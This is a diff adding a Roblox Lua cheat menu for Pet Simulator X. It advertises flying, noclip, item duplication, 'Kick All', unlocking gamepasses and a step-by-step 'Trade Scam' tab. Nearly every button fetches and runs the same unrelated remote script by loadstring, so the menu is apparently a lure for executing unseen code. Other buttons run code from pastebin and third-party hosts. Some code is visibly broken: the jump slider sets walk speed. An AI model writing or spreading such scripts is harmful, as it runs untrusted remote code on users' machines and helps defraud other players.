@@ -1,0 +1,513 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Omega Z v4 | [✨SHINY] Pet Simulator X!", HidePremium = false, IntroText = "Omega Z", SaveConfig = true, ConfigFolder = "OrionTest"})
+
+-- Main Tab
+local Main = Window:MakeTab({
+	Name = "Main",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local MainSection = Main:AddSection({
+	Name = "Best Pet Simulator X Hub Made By MediumGames"
+})
+
+local MainSection = Main:AddSection({
+	Name = "Version: 4.0"
+})
+
+local MainSection = Main:AddSection({
+	Name = "Discord:  MediumGames#2984"
+})
+
+local MainSection = Main:AddSection({
+	Name = "Dupe Status: WORKING"
+})
+
+local MainSection = Main:AddSection({
+	Name = "Supported For: Synapse X, KRNL, Arceus X, Vega X, Fluxus, Evon"
+})
+
+-- Player
+local Player = Window:MakeTab({
+	Name = "Player",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Player:AddButton({
+	Name = "Fly",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Test/main/Fly", true))()
+  	end    
+})
+
+Player:AddSlider({
+	Name = "Walkspeed",
+	Min = 0,
+	Max = 500,
+	Default = 16,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Speed",
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+	end    
+})
+
+Player:AddSlider({
+	Name = "Jump Power",
+	Min = 0,
+	Max = 350,
+	Default = 50,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Jump",
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+	end    
+})
+
+Player:AddButton({
+	Name = "Reset WS/JP",
+	Callback = function()
+      	game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+  	end    
+})
+
+Player:AddButton({
+	Name = "NoClip",
+	Callback = function()
+      	local ScreenGui = Instance.new("ScreenGui")
+        local Frame = Instance.new("Frame")
+        local Drag = Instance.new("TextButton")
+        local TextButton = Instance.new("TextButton")
+        local TextButton_2 = Instance.new("TextButton")
+        local TextLabel = Instance.new("TextLabel")
+        --Properties:
+        ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+        Frame.Parent = ScreenGui
+        Frame.BackgroundColor3 = Color3.new(1, 1, 1)
+        Frame.Position = UDim2.new(0.275453836, 0, 0.186732173, 0)
+        Frame.Size = UDim2.new(0, 379, 0, 373)
+
+        Drag.Name = "Drag"
+        Drag.Parent = Frame
+        Drag.BackgroundColor3 = Color3.new(1, 1, 1)
+        Drag.BorderColor3 = Color3.new(0.917647, 0.917647, 0.917647)
+        Drag.Size = UDim2.new(0, 379, 0, 27)
+        Drag.Text = "Drag"
+        Drag.TextColor3 = Color3.new(0, 0, 0)
+
+        TextButton.Parent = Frame
+        TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
+        TextButton.Position = UDim2.new(0.261265785, 0, 0.352023244, 0)
+        TextButton.Size = UDim2.new(0, 200, 0, 50)
+        TextButton.Font = Enum.Font.SourceSans
+        TextButton.Text = "Noclip R15"
+        TextButton.TextColor3 = Color3.new(0, 0, 0)
+        TextButton.TextSize = 14
+        TextButton.MouseButton1Down:connect(function()
+        nam = game.Players.LocalPlayer.Name
+
+        game:GetService('RunService').Stepped:connect(function()
+        for a, b in pairs(game.Workspace:GetChildren()) do
+        if b.Name == nam then
+        for i, v in pairs(game.Workspace[nam]:GetChildren()) do
+        if v:IsA("BasePart") then
+        v.CanCollide = false
+
+        end
+        end
+        end
+        end
+        end)
+
+        Workspace[nam].Head.Changed:connect(function()
+        for a, b in pairs(game.Workspace:GetChildren()) do
+        if b.Name == nam then
+        for i, v in pairs(game.Workspace[nam]:GetChildren()) do
+        if v:IsA("BasePart") then
+        v.CanCollide = false
+
+        end
+        end
+        end
+        end
+        end)
+        end)
+
+        TextButton_2.Parent = Frame
+        TextButton_2.BackgroundColor3 = Color3.new(1, 1, 1)
+        TextButton_2.Position = UDim2.new(0.261265785, 0, 0.615844727, 0)
+        TextButton_2.Size = UDim2.new(0, 200, 0, 50)
+        TextButton_2.Font = Enum.Font.SourceSans
+        TextButton_2.Text = "Noclip R6"
+        TextButton_2.TextColor3 = Color3.new(0, 0, 0)
+        TextButton_2.TextSize = 14
+        TextButton_2.MouseButton1Down:connect(function()
+        game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
+        game.Players.LocalPlayer.Character.Humanoid.Health = math.huge
+        while true do
+            game:GetService("RunService").Stepped:wait()
+            game.Players.LocalPlayer.Character.Head.CanCollide = false
+            game.Players.LocalPlayer.Character.Torso.CanCollide = false
+        end
+        end)
+
+        TextLabel.Parent = Frame
+        TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+        TextLabel.Position = UDim2.new(0.104106054, 0, 0.111652002, 0)
+        TextLabel.Size = UDim2.new(0, 299, 0, 50)
+        TextLabel.Font = Enum.Font.SourceSans
+        TextLabel.Text = "hack noclip (work all game)"
+        TextLabel.TextColor3 = Color3.new(0, 0, 0)
+        TextLabel.TextSize = 14
+        TextLabel.TextWrapped = true
+        -- Scripts:
+        function SCRIPT_GBXM85_FAKESCRIPT() -- Drag.LocalScript 
+            local script = Instance.new('LocalScript')
+            script.Parent = Drag
+            wanttobemoved=script.Parent.Parent
+            X=wanttobemoved.Position.X.Offset
+            Y=wanttobemoved.Position.Y.Offset
+            XS=wanttobemoved.Position.X.Scale
+            YS=wanttobemoved.Position.Y.Scale
+            function down(posX,posY)--the positions of the mouse
+                drag=true--activate the drag function
+                X=wanttobemoved.Position.X.Offset--redefines the value "X"
+                Y=wanttobemoved.Position.Y.Offset--redefines the value "Y"
+                XS=wanttobemoved.Position.X.Scale
+                YS=wanttobemoved.Position.Y.Scale
+                DposX=posX-X--the mouse's X position offset by the frame's X position.
+                DposY=posY-Y--the mouse's Y position offset by the frame's Y position.
+                print(""..DposX..","..DposY.."")--remembers the values DposX and DposY in the output toolbar.
+            end
+            function up()
+                drag=false--deactivate the drag
+            end
+            function move(posX,posY)--again, the positions of the mouse
+                if drag then--if held down then
+                    wanttobemoved.Position=UDim2.new(XS,posX - DposX,YS,posY - DposY)
+                end
+            end
+            script.Parent.MouseButton1Down:connect(down)
+            script.Parent.MouseButton1Up:connect(up)
+            script.Parent.MouseLeave:connect(up)
+            script.Parent.MouseMoved:connect(move)
+
+        end
+        coroutine.resume(coroutine.create(SCRIPT_GBXM85_FAKESCRIPT))
+  	end    
+})
+
+Player:AddButton({
+	Name = "Friend All In Server",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+Player:AddButton({
+	Name = "Unfriend All In Server",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+-- Auto
+local Auto = Window:MakeTab({
+	Name = "Auto",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local AutoSection = Auto:AddSection({
+	Name = "Auto Open Eggs"
+})
+
+Auto:AddDropdown({
+	Name = "Eggs",
+	Default = "1",
+	Options = {"Cracked Egg", "Golden Cracked Egg", "Spottead Egg", "Golden Spotted Egg", "Wood Egg", "Golden Wood Egg", "Grass Egg", "Golden Grass Egg", "Beachball Egg", "Golden Beachball Egg", "Coconut Egg", "Golden Coconut Egg", "Rock Egg", "Golden Rock Egg", "Geode Egg", "Golden Geode Egg", "Snow Egg", "Golden Snow Egg", "Ice Egg", "Golden Ice Egg", "Icicle Egg", "Golden Icile Egg", "Yeti Egg", "Golden Yeti Egg", "Cactus Egg", "Golden Cactus Egg", "Spiked Egg", "Golden Spiked Egg", "Obsidian Egg", "Golden Obsidian Egg", "Magma Egg", "Golden Magma Egg", "Dominus Egg", "Golden Dominus Egg", "Enchanted Egg", "Golden Enchanted Egg", "Relic Egg", "Golden Relic Egg", "Samurai Egg", "Golden Samurai Egg", "Rainbow Egg", "Golden Rainbow Egg", "Haunted Egg", "Golden Haunted Egg", "Hell Egg", "Golden Hell Egg", "Heaven Egg", "Golden Heaven Egg", "Empyrean Egg", "Golden Empyrean Egg", "Metal Egg", "Golden Metal Egg", "Tech Egg", "Golden Tech Egg", 'Titanium Egg', "Golden Titanium Egg", "Dark Tech Egg", "Golden Dark Tech Egg", 'Steampunk Egg', "Golden Steampunk Egg", "Mechanical Egg", "Golden Mechanical Egg", "Lab Egg", "Golden Lab Egg", "Chemical Egg", "Golden Chemical Egg", "Alien Egg", "Golden Alien Egg", "Martian Egg", "Golden Martian Egg", "Planet Egg", "Golden Planet Egg", "Glitch Egg", "Golden Glitch Egg", "Hacker Egg", "Golden Hacker Egg", "Axolotl Egg", "Golden Axolotl Egg", "Shiny Axolotl Egg", "Golden Shiny Axolotl Egg", "Pixel Egg", "Golden Pixel Egg", "Spotted Pixel Egg", "Golden Spotted Pixel Egg", "Rainbow Egg", "Golden Rainbow Egg", "Paw Egg", "Golden Paw Egg", "Yarn Egg", "Golden Yarn Egg", "Cat Egg", "Golden Cat Egg", "Royal Egg", "Golden Royal Egg", "Pog Egg", "Pumpkin Egg", "Golden Pxumpkin Egg", "Eerie Egg", "Golden Eerie Egg", "Cursed Egg", "Golden Cursed Egg"},
+	Callback = function(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+	end    
+})
+
+Auto:AddButton({
+	Name = "Auto Open Eggs",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+local AutoSection = Auto:AddSection({
+	Name = "Auto Farm"
+})
+
+Auto:AddDropdown({
+	Name = "Areas",
+	Default = "1",
+	Options = {"Shop", "Town", "Forest", "Beach", "Mine", "Winter", "Glacier", "Desert", "Volcano", "Cave", "Tech Entry", "Enchanted Forest", "Ancient Island", "Samurai Island", "Candy Island", "Haunted Island", "Hell Island", "Heaven Island", "Heaven's Gate", "Tech Shop", "Tech City", "Dark Tech", "Steampunk", "Alien Lab", "Steampunk Chest", "Alien Forest", "Glitch", "Giant Alien Chest", "Hacker Portal", "Axolotl Ocean", "Axolotl Deep Ocean", "Axolotl Cave", "Pixel Forest", "Pixel Kyoto", "Pixel Alps", "Pixel Vault", "Cat Paradise", "Cat Backyard", "Cat Taiga", "Cat Kingdom"},
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Auto:AddDropdown({
+	Name = "Methods",
+	Default = "1",
+	Options = {"Multi", "Highest", "Lowest", "Highest to Lowest"},
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Auto:AddButton({
+	Name = "Auto Farm",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+local AutoSection = Auto:AddSection({
+	Name = "Auto Mastery"
+})
+
+Auto:AddDropdown({
+	Name = "Mastery",
+	Default = "1",
+	Options = {"Free Gifts", "Boost Mastery", "Eggs Mastery", "Lootbags Mastery", "Golden Eggs Mastery", "Coin Piles Mastery", "Crates Mastery", "Presents Mastery", "Vaults & Safes Mastery", "Chests Mastery", "Diamond Piles Mastery", "Converting Mastery", "Fusing Mastery", "Enchanting Mastery", "Dark Matter Mastery"},
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Auto:AddButton({
+	Name = "Auto Mastery",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+-- Pets
+local Pets = Window:MakeTab({
+	Name = "Pets",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local PetsSection = Pets:AddSection({
+	Name = "Auto Enchant"
+})
+
+Pets:AddDropdown({
+	Name = "Enchants",
+	Default = "1",
+	Options = {"Coins V", "Fantasy Coins V", "Tech Coins V", "Rainbow Coins V", "Agility III", "Chest Breaker III", "Strenth V", "Super Teamwork", "Diamonds V", "Charm", "Gift III", "Glittering", "Magnet", "Royalty", "Companion III"},
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Pets:AddButton({
+	Name = "Auto Enchant",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+local PetsSection = Pets:AddSection({
+	Name = "Auto Golden/Rainbow"
+})
+
+Pets:AddDropdown({
+	Name = "Pet Amount",
+	Default = "1",
+	Options = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10"},
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Pets:AddButton({
+	Name = "Auto Golden/Rainbow",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+Pets:AddButton({
+	Name = "Auto Golden",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+Pets:AddButton({
+	Name = "Auto Rainbow",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+-- Misc/World
+local World = Window:MakeTab({
+	Name = "World",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+World:AddButton({
+	Name = "Anti AFK",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Anti Lag",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/fBA8Q3Qi", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Chat Spoofer",
+	Callback = function()
+      	loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Reset Character",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Kick All",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Unlock All Gamepasses",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+-- Dupes
+local Dupes = Window:MakeTab({
+	Name = "Dupes",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local DupesSection = Dupes:AddSection({
+	Name = "NOTE: Must have Tier 3 or above Bank."
+})
+
+local DupesSection = Dupes:AddSection({
+	Name = "This only works with HUGES, EXCLUSIVES and GEMS"
+})
+
+local DupesSection = Dupes:AddSection({
+	Name = "Exclusive Dupe DOES NOT work with Party Cats/Hippomelon"
+})
+
+Dupes:AddButton({
+	Name = "Dupe Huges",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+Dupes:AddButton({
+	Name = "Dupe Exclusives",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+local DupesSection = Dupes:AddSection({
+	Name = "If done wrong, there is a 50% chance that the pets will be DELETED!"
+})
+
+-- Trade Scam
+local TradeScam = Window:MakeTab({
+	Name = "TradeScam",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local TradeScamSection = TradeScam:AddSection({
+	Name = "Instructions: Trade someone and select a pet"
+})
+
+local TradeScamSection = TradeScam:AddSection({
+	Name = "Click on the 'Trade Scam' Function and remove the pet."
+})
+
+local TradeScamSection = TradeScam:AddSection({
+	Name = "Accept the Trade."
+})
+
+local TradeScamSection = TradeScam:AddSection({
+	Name = "This is only a 40% chance that this will work."
+})
+
+TradeScam:AddButton({
+	Name = "TradeScam",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
+  	end    
+})
+
+-- Other
+local Other = Window:MakeTab({
+	Name = "Other",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local TradeScamSection = TradeScam:AddSection({
+	Name = "Script Hubs"
+})
+
+Other:AddButton({
+	Name = "Infinite Yield",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+  	end    
+})
+
+Other:AddButton({
+	Name = "Thunder Z",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/Script"))()
+  	end    
+})
+
+Other:AddButton({
+	Name = "BK Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua"))()
+  	end    
+})
+
+Other:AddButton({
+	Name = "Moonlight",
+	Callback = function()
+      	loadstring(game:HttpGet('https://cookie-hosting.xyz/Roblox/Moonlight/Loader.lua'))()
+  	end    
+})
+
+OrionLib:Init()
